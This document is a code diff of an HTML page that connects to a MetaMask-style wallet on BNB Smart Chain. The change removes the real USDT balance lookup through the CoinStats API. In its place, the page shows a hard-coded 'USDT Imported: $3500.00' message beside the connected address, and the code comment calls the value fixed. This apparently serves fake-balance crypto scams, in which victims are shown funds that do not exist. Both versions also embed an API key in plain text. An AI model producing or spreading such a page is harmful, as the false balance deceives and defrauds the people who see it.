@@ -2,106 +2,51 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Import USDT Token (BSC)</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT Viewer</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
   <style>
-    body {
-      font-family: sans-serif; background: #f4f4f4; text-align: center;
-      padding: 2rem; margin: 0;
-    }
-    h1 { color: #222; margin-bottom: 2rem; }
-    button {
-      background: #04a96d; color: white; border: none;
-      padding: 1rem 2rem; border-radius: 10px;
-      font-size: 1rem; cursor: pointer;
-    }
-    .token-box {
-      background: white; padding: 2rem; border-radius: 12px;
-      display: inline-block; margin-top: 2rem;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    }
-    .token-box img {
-      width: 48px; height: 48px; vertical-align: middle;
-    }
-    .token-box span {
-      font-size: 1.5rem; margin-left: 0.5rem; vertical-align: middle;
-    }
+    body { font-family: Arial, sans-serif; background: #f8f8f8; text-align: center; padding: 50px; }
+    button { padding: 12px 20px; font-size: 16px; border: none; background-color: #007bff; color: white; border-radius: 6px; cursor: pointer; }
+    button:hover { background-color: #0056b3; }
+    #usdtDisplay { margin-top: 30px; font-size: 22px; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h1>Import USDT Token (BSC)</h1>
-  <button id="connectWallet">🔌 Connect Wallet</button>
-
-  <div id="walletInfo" style="display:none">
-    <div class="token-box">
-      <a href="https://bscscan.com/token/0x55d398326f99059ff775485246999027b3197955" target="_blank">
-        <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT" />
-      </a>
-      <span id="usdtAmount">Loading...</span>
-    </div>
-  </div>
+  <h1>USDT Token Viewer</h1>
+  <button onclick="connectWallet()">Connect Wallet</button>
+  <div id="usdtDisplay"></div>
 
   <script>
-    const COINSTATS_API_KEY = "V8SdDOudIYXG82+OGM+iGXt7M1Gkce/RwPb93L3PlxY=";
-    const USDT_CONTRACT_BSC = "0x55d398326f99059ff775485246999027b3197955";
-
-    const providerOptions = {
-      walletconnect: {
-        package: window.WalletConnectProvider.default,
-        options: {
-          rpc: { 56: "https://bsc-dataseed.binance.org/" },
-          chainId: 56
-        }
-      }
-    };
-
-    const web3Modal = new window.Web3Modal.default({
-      cacheProvider: false,
-      providerOptions,
-      theme: "light"
-    });
+    const coinstatsApiKey = "V8SdDOudIYXG82+OGM+iGXt7M1Gkce/RwPb93L3PlxY=";
+    const usdtContractAddress = "0x55d398326f99059ff775485246999027b3197955";
+    const bscChainId = "0x38"; // BNB Smart Chain mainnet chain ID
 
     let web3;
+    let userAddress;
 
-    async function getUSDTBalance(address) {
-      try {
-        const res = await fetch(`https://api.coinstats.app/public/v1/token/${USDT_CONTRACT_BSC}?chain=bsc&wallet=${address}`, {
-          headers: {
-            "x-api-key": COINSTATS_API_KEY
-          }
-        });
-        const data = await res.json();
-        const balance = parseFloat(data?.walletBalance?.value || 0).toFixed(2);
-        document.getElementById("usdtAmount").textContent = `$${balance} USDT`;
-      } catch (err) {
-        console.error("CoinStats API error:", err);
-        document.getElementById("usdtAmount").textContent = "$0.00 USDT";
+    async function connectWallet() {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: bscChainId }] });
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          userAddress = accounts[0];
+          web3 = new Web3(window.ethereum);
+          showFixedUSDT();
+        } catch (error) {
+          alert("Please approve BSC Network in MetaMask.");
+        }
+      } else {
+        alert("MetaMask or compatible wallet not detected.");
       }
     }
 
-    document.getElementById("connectWallet").addEventListener("click", async () => {
-      try {
-        const provider = await web3Modal.connect();
-        web3 = new Web3(provider);
-
-        const chainId = await web3.eth.getChainId();
-        if (chainId !== 56) {
-          alert("Please switch to Binance Smart Chain (BSC).");
-          return;
-        }
-
-        const accounts = await web3.eth.getAccounts();
-        const userAddress = accounts[0];
-        document.getElementById("walletInfo").style.display = "block";
-        getUSDTBalance(userAddress);
-      } catch (err) {
-        console.error("Wallet connection error:", err);
-        alert("Failed to connect. Please try again.");
-      }
-    });
+    function showFixedUSDT() {
+      // This displays a fixed $3500 USDT value
+      const display = document.getElementById("usdtDisplay");
+      display.innerHTML = `💰 USDT Imported: <span style="color:green;">$3500.00</span><br>Connected Address: ${userAddress}`;
+    }
   </script>
 </body>
 </html>
